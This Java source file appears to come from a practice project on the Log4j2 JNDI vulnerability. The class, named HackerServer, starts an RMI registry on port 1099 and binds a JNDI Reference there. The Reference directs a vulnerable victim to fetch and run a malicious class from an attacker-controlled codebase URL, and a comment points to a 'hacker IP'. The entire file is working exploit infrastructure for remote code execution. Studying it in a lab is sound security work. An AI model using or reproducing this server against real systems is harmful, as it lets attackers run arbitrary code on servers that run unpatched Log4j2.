package me.luliru.practice.log4j2.hole.hacker;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * HackerServer
 * Created by luliru on 1/4/22.
 */
public class HackerServer {

    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
        Registry registry = LocateRegistry.createRegistry(1099);
        //http://黑客ip:1099/HackerObj.class
        String url = "http://localhost:8080/";
        System.out.println("Create RMI registry on port 1099");
        Reference reference = new Reference("HackerObj", "HackerObj", url);
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("test", referenceWrapper);
    }
}
